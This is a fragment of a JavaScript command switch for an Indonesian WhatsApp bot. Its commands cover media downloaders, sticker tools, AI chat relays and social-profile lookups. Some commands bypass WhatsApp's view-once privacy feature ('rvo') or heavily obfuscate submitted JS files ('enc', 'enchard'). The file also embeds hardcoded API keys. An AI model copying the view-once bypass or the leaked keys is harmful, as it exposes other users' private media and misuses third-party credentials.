let araara = new Array()
let urutan = 0
for (let a of pin) {
try {
let imgsc = await prepareWAMessageMedia({ image: {url: a.url}}, { upload: gisnaxd.waUploadToServer })
await araara.push({
header: proto.Message.InteractiveMessage.Header.fromObject({
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Link Tautan Foto\",\"url\":\"${a.url}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
})
} catch {}
}
const msgii = await generateWAMessageFromContent(m.chat, {
viewOnceMessageV2Extension: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: `\nBerikut adalah foto hasil pencarian dari *google*`
}),
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: araara
})
})}
}}, {userJid: m.sender, quoted: m})
await gisnaxd.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "ytmp3": {
if (!text) return m.reply(example("linknya"))

    

if (!text.startsWith("https://")) return m.reply("Link Tautan Tidak Valid")
var anu = await ytmp3(text)
if (anu.audio) {
let urlMp3 = anu.audio
await gisnaxd.sendMessage(m.chat, {audio: {url: urlMp3}, mimetype: "audio/mpeg"}, {quoted: m})
} else {
return m.reply("Error! vidio atau lagu tidak ditemukan")
}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "block": case "blok": {
if (!isCreator) return Reply(global.mess.owner)
if (m.isGroup && !m.quoted && !text) return m.reply(example("@tag/nomornya"))
const mem = !m.isGroup ? m.chat : m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : ""
await gisnaxd.updateBlockStatus(mem, "block")
if (m.isGroup) gisnaxd.sendMessage(m.chat, {text: `Berhasil memblokir @${mem.split('@')[0]}`, mentions: [mem]}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "ytmp4": {
if (!text) return m.reply(example("linknya"))

    

if (!text.startsWith("https://")) return m.reply("Link Tautan Tidak Valid")
var anu = await ytmp4(text)
if (anu.video) {
let urlMp3 = anu.video
await gisnaxd.sendMessage(m.chat, {video: {url: urlMp3}, mimetype: "video/mp4"}, {quoted: m})
} else {
return m.reply("Error! vidio atau lagu tidak ditemukan")
}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "tiktokmp3": case "ttmp3": case "ttaudio": {
if (!text) return m.reply(example("linknya"))

    

if (!text.startsWith('https://')) return m.reply("Link tautan tidak valid")
await tiktokDl(text).then(async (res) => {
if (!res.status) return m.reply("Error! Result Not Found")
await gisnaxd.sendMessage(m.chat, {audio: {url: res.music_info.url}, mimetype: "audio/mpeg"}, {quoted: m})
}).catch((e) => m.reply("Error"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "spotify": {
if (!text) return m.reply(example("linknya"))

    

if (!text.startsWith('https://')) return m.reply("Link tautan tidak valid")
await fetchJson(`https://api.siputzx.my.id/api/d/spotify?url=${text}`).then(async (res) => {
if (!res.status) return m.reply("Error! Result Not Found")
await gisnaxd.sendMessage(m.chat, {audio: {url: res.result}, mimetype: "audio/mpeg"}, {quoted: m})
}).catch((e) => m.reply("Error"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "apkmod": {
if (!text) return m.reply(example("capcut"))

    

await fetchJson(`https://api.siputzx.my.id/api/apk/apkmody?search=${text}`).then((res) => {
let teks = ""
for (let i of res.result) {
teks += `\n* *Nama Apk :* ${i.name}
* *Link Download:* ${i.url}\n`
}
m.reply(teks)
gisnaxd.sendMessage(m.chat, {react: {text: '', key: m.key}})
}).catch(e => m.reply("Error"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "instagram": case "igdl": case "ig": {
if (!text) return m.reply(example("linknya"))

if (!text.startsWith('https://')) return m.reply("Link tautan tidak valid")
await fetchJson(`https://api.neoxr.eu/api/ig?url=${text}&apikey=sumiati`).then(async (res) => {
if (!res.status) return m.reply("Error! Result Not Found")
if (res.result.downloadUrls.length > 1) {
for (let i of res.result.downloadUrls) {
await gisnaxd.sendMessage(m.chat, {image: {url: i}, caption: "*Instagram Downloader ✅*"}, {quoted: m})
}
} else {
await gisnaxd.sendMessage(m.chat, {video: {url: res.result.downloadUrls[0]}, mimetype: "video/mp4", caption: "*Instagram Downloader ✅*"}, {quoted: m})
}
}).catch((e) => m.reply("Error"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "doodstream": case "dood": {
if (!text) return m.reply(example("linknya"))

    

if (!text.startsWith('https://')) return m.reply("Link tautan tidak valid")
try {
let res = await Buddy(`${text}`)
await gisnaxd.sendMessage(m.chat, {video: {url: res.response.gif.url}, mimetype: "video/mp4", caption: "*Doodstream Downloader ✅*"}, {quoted: m})
} catch (err) {
console.log(err)
m.reply("Error result not found")
}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "terabox": {
if (!text) return m.reply(example("linknya"))

    

if (!text.startsWith('https://')) return m.reply("Link tautan tidak valid")
await fetchJson(`https://restapi-v2.simplebot.my.id/download/terabox?url=${text}`).then(async (res) => {
if (!res.status) return m.reply("Error! Result Not Found")
await gisnaxd.sendMessage(m.chat, {document: {url: res.result}, mimetype: "application/zip", fileName: "Terabox.zip", caption: "*Terabox Downloader ✅*"}, {quoted: m})

}).catch((e) => m.reply("Error link tautan tidak didukung"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "facebook": case "fb": case "fbdl": {
if (!text) return m.reply(example("linknya"))

    

if (!text.startsWith('https://')) return m.reply("Link tautan tidak valid")
await fetchJson(`${global.webapi}/api/download/facebook?url=${text}&apikey=${global.restapi}`).then(async (res) => {
if (!res.status) return m.reply("Error! Result Not Found")
return gisnaxd.sendMessage(m.chat, {video: {url: res.result.media.video_hd || res.result.media.video_sd}, mimetype: "video/mp4", caption: "*Facebook Downloader ✅*"}, {quoted: m})
}).catch((e) => m.reply("Error"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "capcut": {
if (!text) return m.reply(example("linknya"))

    

if (!text.startsWith('https://')) return m.reply("Link tautan tidak valid")
await fetchJson(`${global.webapi}/api/download/capcut?url=${text}&apikey=${global.restapi}`).then(async (res) => {
if (!res.status) return m.reply("Error! Result Not Found")
await gisnaxd.sendMessage(m.chat, {video: {url: res.result.videoUrl}, mimetype: "video/mp4", caption: "*Capcut Downloader ✅*"}, {quoted: m})
}).catch((e) => m.reply("Error"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "xnxxdl": {
if (!text) return m.reply(example("linknya"))

    

if (!text.startsWith('https://')) return m.reply("Link tautan tidak valid")
await fetchJson(`https://restapi-v2.simplebot.my.id/download/xnxx?url=${text}`).then(async (res) => {
if (!res.status) return m.reply("Error! Result Not Found")
await gisnaxd.sendMessage(m.chat, {video: {url: res.result.files.hight || res.result.files.low}, mimetype: "video/mp4", caption: "*XNXX Downloader ✅*"}, {quoted: m})
}).catch((e) => m.reply("Error"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "gitclone": {
if (!text) return m.reply(example("https://github.com/username"))

    

let regex = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
if (!regex.test(text)) return m.reply("Link tautan tidak valid")
try {
    let [, user, repo] = args[0].match(regex) || []
    repo = repo.replace(/.git$/, '')
    let url = `https://api.github.com/repos/${user}/${repo}/zipball`
    let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
    gisnaxd.sendMessage(m.chat, { document: { url: url }, mimetype: 'application/zip', fileName: `${filename}`}, { quoted : m })
} catch (e) {
await m.reply(`Error! repositori tidak ditemukan`)
}}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "googledrive": case "gdrive": {
if (!text) return m.reply(example("linknya"))

    

if (!text.startsWith("https://")) return m.reply(example("linknya"))
try {
    const res = await fetchJson(`${global.webapi}/api/download/gdrive?url=${text}&apikey&apikey=${global.restapi}`)
   await gisnaxd.sendMessage(m.chat, { document: { url: res.result.downloadUrl }, mimetype: res.result.mimetype, fileName: `${res.result.fileName}`}, { quoted : m })
} catch (e) {
await m.reply(`Error! result tidak ditemukan`)
}}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "tt": case "tiktok": {
if (!text) return m.reply(example("url"))

    

if (!text.startsWith("https://")) return m.reply(example("url"))
await tiktokDl(q).then(async (result) => {
if (!result.status) return m.reply("Error")
if (result.durations == 0 && result.duration == "0 Seconds") {
let araara = new Array()
let urutan = 0
for (let a of result.data) {
let imgsc = await prepareWAMessageMedia({ image: {url: `${a.url}`}}, { upload: gisnaxd.waUploadToServer })
await araara.push({
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `Foto Slide Ke *${urutan += 1}*`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Link Tautan Foto\",\"url\":\"${a.url}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
})
}
const msgii = await generateWAMessageFromContent(m.chat, {
viewOnceMessageV2Extension: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: "*Tiktok Downloader ✅*"
}),
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: araara
})
})}
}}, {userJid: m.sender, quoted: m})
await gisnaxd.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
} else {
let urlVid = await result.data.find(e => e.type == "nowatermark_hd" || e.type == "nowatermark")
await gisnaxd.sendMessage(m.chat, {video: {url: urlVid.url}, mimetype: 'video/mp4', caption: `*Tiktok Downloader ✅*`}, {quoted: m})
}
}).catch(e => console.log(e))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "ssweb": {
if (!text) return m.reply(example("https://example.com"))

    

if (!isUrl(text)) return m.reply(example("https://example.com"))
var data = await fetchJson(`https://api.siputzx.my.id/api/tools/ssweb?url=${text}`)
await gisnaxd.sendMessage(m.chat, { image: { url: data.result.iurl}, mimetype: "image/png"}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "enc": case "encrypt": {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted) return m.reply(example("dengan reply file .js"))

    

if (mime !== "application/javascript" && mime !== "text/javascript") return m.reply("Reply file .js")
let media = await m.quoted.download()
let filename = m.quoted.message.documentMessage.fileName
await fs.writeFileSync(`./database/sampah/${filename}`, media)
await m.reply("Memproses encrypt code . . .")
await JsConfuser.obfuscate(await fs.readFileSync(`./database/sampah/${filename}`).toString(), {
  target: "node",
  preset: "high",
  calculator: true,
  compact: true,
  hexadecimalNumbers: true,
  controlFlowFlattening: 0.75,
  deadCode: 0.2,
  dispatcher: true,
  duplicateLiteralsRemoval: 0.75,
  flatten: true,
  globalConcealing: true,
  identifierGenerator: "randomized",
  minify: true,
  movedDeclarations: true,
  objectExtraction: true,
  opaquePredicates: 0.75,
  renameVariables: true,
  renameGlobals: true,
  shuffle: { hash: 0.5, true: 0.5 },
  stack: true,
  stringConcealing: true,
  stringCompression: true,
  stringEncoding: true,
  stringSplitting: 0.75,
  rgf: false
}).then(async (obfuscated) => {
  await fs.writeFileSync(`./database/sampah/${filename}`, obfuscated)
  await gisnaxd.sendMessage(m.chat, {document: fs.readFileSync(`./database/sampah/${filename}`), mimetype: "application/javascript", fileName: filename, caption: "Encrypt file sukses ✅"}, {quoted: m})
}).catch(e => m.reply("Error :" + e))
  await fs.unlinkSync(`./database/sampah/${filename}`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "enchard": case "encrypthard": {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted) return m.reply("Reply file .js")

    

if (mime !== "application/javascript" && mime !== "text/javascript") return m.reply("Reply file .js")
let media = await m.quoted.download()
let filename = m.quoted.message.documentMessage.fileName
await fs.writeFileSync(`./@hardenc${filename}.js`, media)
await m.reply("Memproses encrypt hard code . . .")
await JsConfuser.obfuscate(await fs.readFileSync(`./@hardenc${filename}.js`).toString(), {
  target: "node",
    preset: "high",
    compact: true,
    minify: true,
    flatten: true,

    identifierGenerator: function() {
        const originalString = 
            "/*Qoupay/*^/*($break)*/" + 
            "/*Qoupay/*^/*($break)*/";

        function hapusKarakterTidakDiinginkan(input) {
            return input.replace(
                /[^a-zA-Z/*ᨒZenn/*^/*($break)*/]/g, ''
            );
        }

        function stringAcak(panjang) {
            let hasil = '';
            const karakter = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
            const panjangKarakter = karakter.length;

            for (let i = 0; i < panjang; i++) {
                hasil += karakter.charAt(
                    Math.floor(Math.random() * panjangKarakter)
                );
            }
            return hasil;
        }

        return hapusKarakterTidakDiinginkan(originalString) + stringAcak(2);
    },

    renameVariables: true,
    renameGlobals: true,

    // Kurangi encoding dan pemisahan string untuk mengoptimalkan ukuran
    stringEncoding: 0.01, 
    stringSplitting: 0.1, 
    stringConcealing: true,
    stringCompression: true,
    duplicateLiteralsRemoval: true,

    shuffle: {
        hash: false,
        true: false
    },

    stack: false,
    controlFlowFlattening: false, 
    opaquePredicates: false, 
    deadCode: false, 
    dispatcher: false,
    rgf: false,
    calculator: false,
    hexadecimalNumbers: false,
    movedDeclarations: true,
    objectExtraction: true,
    globalConcealing: true
}).then(async (obfuscated) => {
  await fs.writeFileSync(`./@hardenc${filename}.js`, obfuscated)
  await gisnaxd.sendMessage(m.chat, {document: fs.readFileSync(`./@hardenc${filename}.js`), mimetype: "application/javascript", fileName: filename, caption: "Encrypt File JS Sukses! Type:\nString"}, {quoted: m})
}).catch(e => m.reply("Error :" + e))
await fs.unlinkSync(`./@hardenc${filename}.js`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "shortlink": case "shorturl": {
if (!text) return m.reply(example("https://example.com"))
if (!isUrl(text)) return m.reply(example("https://example.com"))

    

var res = await axios.get('https://tinyurl.com/api-create.php?url='+encodeURIComponent(text))
var link = `
* *Shortlink by tinyurl.com*
${res.data.toString()}
`
return m.reply(link)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "shortlink-dl": {
if (!text) return m.reply(example("https://example.com"))
if (!isUrl(text)) return m.reply(example("https://example.com"))

    

var a = await fetch(`https://moneyblink.com/st/?api=524de9dbd18357810a9e6b76810ace32d81a7d5f&url=${text}`)
await gisnaxd.sendMessage(m.chat, {text: a.url}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "idgc": case "cekidgc": {
if (!m.isGroup) return Reply(mess.group)
m.reply(m.chat)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "listgc": case "listgrup": {
if (!isCreator) return
let teks = ` *── List all group chat*\n`
let a = await gisnaxd.groupFetchAllParticipating()
let gc = Object.values(a)
teks += `\n* *Total group :* ${gc.length}\n`
for (const u of gc) {
teks += `\n* *ID :* ${u.id}
* *Nama :* ${u.subject}
* *Member :* ${u.participants.length}
* *Status :* ${u.announce == false ? "Terbuka": "Hanya Admin"}
* *Pembuat :* ${u?.subjectOwner ? u?.subjectOwner.split("@")[0] : "Sudah Keluar"}\n`
}
return m.reply(teks)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "cekidch": case "idch": {
if (!text) return m.reply(example("linkchnya"))
if (!text.includes("https://whatsapp.com/channel/")) return m.reply("Link tautan tidak valid")
let result = text.split('https://whatsapp.com/channel/')[1]
let res = await gisnaxd.newsletterMetadata("invite", result)
let teks = `
* *ID :* ${res.id}
* *Nama :* ${res.name}
* *Total Pengikut :* ${res.subscribers}
* *Status :* ${res.state}
* *Verified :* ${res.verification == "VERIFIED" ? "Terverifikasi" : "Tidak"}
`
return m.reply(teks)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "pin": case "pinterest": {
if (!text) return m.reply(example("anime dark"))

    

await gisnaxd.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let pin = await pinterest2(text)
if (pin.length > 10) await pin.splice(0, 11)
const txts = text
let araara = new Array()
let urutan = 0
for (let a of pin) {
let imgsc = await prepareWAMessageMedia({ image: {url: `${a.images_url}`}}, { upload: gisnaxd.waUploadToServer })
await araara.push({
header: proto.Message.InteractiveMessage.Header.fromObject({
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Link Tautan Foto\",\"url\":\"${a.images_url}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
})
}
const msgii = await generateWAMessageFromContent(m.chat, {
viewOnceMessageV2Extension: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: `\nBerikut adalah foto hasil pencarian dari *pinterest*`
}),
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: araara
})
})}
}}, {userJid: m.sender, quoted: m})
await gisnaxd.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "ai": case "gpt": case "openai": {

    

let talk = text ? text : "hai"
await fetchJson(`${global.webapi}/api/ai/openai?text=${talk}&apikey=${global.restapi}`).then(async (res) => {
await m.reply(res.result)
}).catch(e => m.reply(e.toString()))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "deepseek": case "depsek": case "deepsek": {

    

let talk = text ? text : "Hallo Kamu Siapa ?"
await fetchJson("https://api.siputzx.my.id/api/ai/deepseek?prompt=" + talk).then(async (res) => {
await m.reply(res.result)
}).catch(e => m.reply(e.toString()))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "brat": {
if (!text) return m.reply(example('teksnya'))

    

let brat = `${global.webapi}/api/tools/imagecreator/brat?text=${text}&apikey=${global.restapi}`
let response = await axios.get(brat, { responseType: "arraybuffer" })
let videoBuffer = response.data;
try {
await gisnaxd.sendAsSticker(m.chat, videoBuffer, m, {packname: global.packname})
} catch {

}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "emojimix": {
if (!text) return m.reply(example('😀|😍'))
if (!text.split("|")) return m.reply(example('😀|😍'))

    

let [e1, e2] = text.split("|")
let brat = `https://restapi-v2.simplebot.my.id/tools/emojimix?emoji1=${encodeURIComponent(e1)}&emoji2=${encodeURIComponent(e2)}`
let videoBuffer = await getBuffer(brat)
try {
await gisnaxd.sendAsSticker(m.chat, videoBuffer, m, {packname: global.packname})
} catch {}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "bratvid":  case "bratvideo": {
if (!text) return m.reply(example('teksnya'))

    

try {
let brat = `https://fgsi-brat.hf.space/?text=${encodeURIComponent(text)}&isVideo=true`;
let response = await axios.get(brat, { responseType: "arraybuffer" });
let videoBuffer = response.data;
let stickerBuffer = await gisnaxd.sendAsSticker(m.chat, videoBuffer, m, {
packname: global.packname,
})
} catch (err) {
console.error("Error:", err);
}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "emojigif": {
if (!text) return m.reply(example('😍'))

    

try {
let brat = `https://restapi-v2.simplebot.my.id/tools/emojitogif?emoji=${encodeURIComponent(text)}`;
let response = await axios.get(brat, { responseType: "arraybuffer" });
let videoBuffer = response.data;
let stickerBuffer = await gisnaxd.sendAsSticker(m.chat, videoBuffer, m, {
packname: global.packname,
})
} catch (err) {
console.error("Error:", err);
}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "qc": {
if (!text) return m.reply(example('teksnya'))

    

let warna = ["#000000", "#ff2414", "#22b4f2", "#eb13f2"]
var ppuser
try {
ppuser = await gisnaxd.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://telegra.ph/file/a059a6a734ed202c879d3.jpg'
}
const json = {
  "type": "quote",
  "format": "png",
  "backgroundColor": "#000000",
  "width": 812,
  "height": 968,
  "scale": 2,
  "messages": [
    {
      "entities": [],
      "avatar": true,
      "from": {
        "id": 1,
        "name": m.pushName,
        "photo": {
          "url": ppuser
        }
      },
      "text": text,
      "replyMessage": {}
    }
  ]
};
        const response = axios.post('https://bot.lyo.su/quote/generate', json, {
        headers: {'Content-Type': 'application/json'}
}).then(async (res) => {
    const buffer = Buffer.from(res.data.result.image, 'base64')
    let tempnya = "./library/database/sampah/"+m.sender+".png"
await fs.writeFile(tempnya, buffer, async (err) => {
if (err) return m.reply("Error")
await gisnaxd.sendAsSticker(m.chat, tempnya, m, {packname: global.packname})
await fs.unlinkSync(`${tempnya}`)
})
})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "s": case "sticker": case "stiker": {
if (!/image|video/gi.test(mime)) return m.reply(example("dengan kirim media"))
if (/video/gi.test(mime) && qmsg.seconds > 15) return m.reply("Durasi vidio maksimal 15 detik!")

    

var image = await gisnaxd.downloadAndSaveMediaMessage(qmsg)
await gisnaxd.sendAsSticker(m.chat, image, m, {packname: global.packname})
await fs.unlinkSync(image)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "swm": case "stickerwm": case "stikerwm": case "wm": {
if (!text) return m.reply(example("namamu dengan kirim media"))
if (!/image|video/gi.test(mime)) return m.reply(example("namamu dengan kirim media"))
if (/video/gi.test(mime) && qmsg.seconds > 15) return m.reply("Durasi vidio maksimal 15 detik!")

    

var image = await gisnaxd.downloadAndSaveMediaMessage(qmsg)
await gisnaxd.sendAsSticker(m.chat, image, m, {packname: text})
await fs.unlinkSync(image)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "rvo": case "readviewonce": {
if (!m.quoted) return m.reply(example("dengan reply pesannya"))
let msg = m.quoted.message
    let type = Object.keys(msg)[0]
if (!msg[type].viewOnce) return m.reply("Pesan itu bukan viewonce!")
let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : type == 'videoMessage' ? 'video' : 'audio')
    let buffer = Buffer.from([])
    for await (const chunk of media) {
        buffer = Buffer.concat([buffer, chunk])
    }
    if (/video/.test(type)) {
        return gisnaxd.sendMessage(m.chat, {video: buffer, caption: msg[type].caption || ""}, {quoted: m})
    } else if (/image/.test(type)) {
        return gisnaxd.sendMessage(m.chat, {image: buffer, caption: msg[type].caption || ""}, {quoted: m})
    } else if (/audio/.test(type)) {
        return gisnaxd.sendMessage(m.chat, {audio: buffer, mimetype: "audio/mpeg", ptt: true}, {quoted: m})
    } 
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "tourl": case "tourl2": {
if (!/image|video/.test(mime)) return m.reply(example("dengan reply foto/vidio"))
async function dt (buffer) {
  const fetchModule = await import('node-fetch');
  const fetch = fetchModule.default
  let { ext } = await fromBuffer(buffer);
  let bodyForm = new FormData();
  bodyForm.append("fileToUpload", buffer, "file." + ext);
  bodyForm.append("reqtype", "fileupload");
  let res = await fetch("https://catbox.moe/user/api.php", {
    method: "POST",
    body: bodyForm,
  });
  let data = await res.text();
  return data;
}

let aa = m.quoted ? await m.quoted.download() : await m.download()
let dd = await dt(aa)
await gisnaxd.sendMessage(m.chat, {text: `*Url :* ${dd}\n*Expired :* Permanen`}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "readqr": {
if (!/image|video/.test(mime)) return m.reply(example("dengan reply qris"))
const Jimp = require("jimp");
const QrCode = require("qrcode-reader");
async function readQRISFromBuffer(buffer) {
    return new Promise(async (resolve, reject) => {
        try {
            const image = await Jimp.read(buffer);
            const qr = new QrCode();
            qr.callback = (err, value) => {
                if (err) return reject(err);
                resolve(value ? value.result : null);
            };
            qr.decode(image.bitmap);
        } catch (error) {
            reject(error);
        }
    });
}

let aa = m.quoted ? await m.quoted.download() : await m.download()
let dd = await readQRISFromBuffer(aa)
await gisnaxd.sendMessage(m.chat, {text: `*Data :*\n${dd}`}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "tr": case "translate": {
let language
let teks
let defaultLang = "en"
if (text || m.quoted) {
let translate = require('translate-google-api')
if (text && !m.quoted) {
if (args.length < 2) return m.reply(example("id good night"))
language = args[0]
teks = text.split(" ").slice(1).join(' ')
} else if (m.quoted) {
if (!text) return m.reply(example("id good night"))
if (args.length < 1) return m.reply(example("id good night"))
if (!m.quoted.text) return m.reply(example("id good night"))
language = args[0]
teks = m.quoted.text
}
let result
try {
result = await translate(`${teks}`, {to: language})
} catch (e) {
result = await translate(`${teks}`, {to: defaultLang})
} finally {
m.reply(result[0])
}
} else {
return m.reply(example("id good night"))
}}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "tohd": case "hd": case "remini": {
if (!/image/.test(mime)) return m.reply(example("dengan kirim/reply foto"))
let foto = await gisnaxd.downloadAndSaveMediaMessage(qmsg)
let result = await remini(await fs.readFileSync(foto), "enhance")
await gisnaxd.sendMessage(m.chat, {image: result}, {quoted: m})
await fs.unlinkSync(foto)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "ocr": {
if (!/image/.test(mime)) return m.reply(example("dengan kirim/reply foto"))
async function dt (buffer) {
  const fetchModule = await import('node-fetch');
  const fetch = fetchModule.default
  let { ext } = await fromBuffer(buffer);
  let bodyForm = new FormData();
  bodyForm.append("fileToUpload", buffer, "file." + ext);
  bodyForm.append("reqtype", "fileupload");
  let res = await fetch("https://catbox.moe/user/api.php", {
    method: "POST",
    body: bodyForm,
  });
  let data = await res.text();
  return data;
}

let aa = m.quoted ? await m.quoted.download() : await m.download()
let dd = await dt(aa)
const resnya = await fetchJson(`https://restapi-v2.simplebot.my.id/tools/ocr?url=${dd}`)
await gisnaxd.sendMessage(m.chat, {text: resnya.result.toString()}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "removebg": {
if (!/image/.test(mime)) return m.reply(example("dengan kirim/reply foto"))

    

async function dt (buffer) {
  const fetchModule = await import('node-fetch');
  const fetch = fetchModule.default
  let { ext } = await fromBuffer(buffer);
  let bodyForm = new FormData();
  bodyForm.append("fileToUpload", buffer, "file." + ext);
  bodyForm.append("reqtype", "fileupload");
  let res = await fetch("https://catbox.moe/user/api.php", {
    method: "POST",
    body: bodyForm,
  });
  let data = await res.text();
  return data;
}

let aa = m.quoted ? await m.quoted.download() : await m.download()
let dd = await dt(aa)
const resnya = await fetchJson(`https://api.siputzx.my.id/api/imgedit/removebg?image=${dd}`)
await gisnaxd.sendMessage(m.chat, {image: await getBuffer(resnya.result), caption: "Remove Background Done ✅"}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "tiktokstalk": case "ttstalk": {
if (!text) return m.reply(example("username"))

    

await gisnaxd.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
const res = await fetchJson(`https://restapi-v2.simplebot.my.id/stalk/tiktok?user=${text}`)
if (!res.status) return m.reply("Error nama pengguna tidak ditemukan")
const teks = `
* *Nama :* ${res.result.nickname}
* *Username :* ${res.result.uniqueId}
* *Bio :* ${res?.result?.signature || ""}
* *Followers :* ${res.result.followerCount}
* *Following :* ${res.result.followingCount}
* *Private :* ${res.result.privateAccount == true ? "Ya" : "Tidak"}
`
await gisnaxd.sendMessage(m.chat, {image: {url: res.result.avatarMedium}, caption: teks}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "igstalk": {
if (!text) return m.reply(example("username"))

    

await gisnaxd.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
const res = await fetchJson(`https://restapi-v2.simplebot.my.id/stalk/instagram?user=${text}`)
if (!res.status) return m.reply("Error nama pengguna tidak ditemukan")
const teks = `
* *Nama :* ${res.result.name}
* *Username :* ${res.result.username}
* *Bio :* ${res.result.bio}
* *Total Postingan :* ${res.result.posts}
* *Followers :* ${res.result.followers}
* *Following :* ${res.result.following}
`
await gisnaxd.sendMessage(m.chat, {image: {url: res.result.avatar}, caption: teks}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "ytstalk": {
if (!text) return m.reply(example("username"))

    

await gisnaxd.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let res = await fetchJson(`https://restapi-v2.simplebot.my.id/stalk/youtube?user=${text}`)
if (!res.status) return m.reply("Error nama pengguna tidak ditemukan")
res = res.result.channelMetadata
const teks = `
* *Username :* ${res.username}
* *Subscriber :* ${res.subscriberCount}
* *Total Postingan :* ${res.videoCount}
* *Tautan :* ${res.channelUrl}
* *Deskripsi Channel :* ${res.description}
`
await gisnaxd.sendMessage(m.chat, {image: {url: res.avatarUrl}, caption: teks}, {quoted: m})
}
break

